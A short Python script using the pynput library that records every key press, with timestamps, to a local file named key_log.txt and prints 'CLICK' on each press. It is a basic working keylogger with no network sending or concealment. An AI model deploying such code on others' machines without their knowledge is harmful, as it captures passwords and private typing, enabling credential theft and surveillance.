import pynput
from pynput.keyboard import Key, Listener
import logging
print("STARTING")
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')


def on_press(key):
    print("CLICK")
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()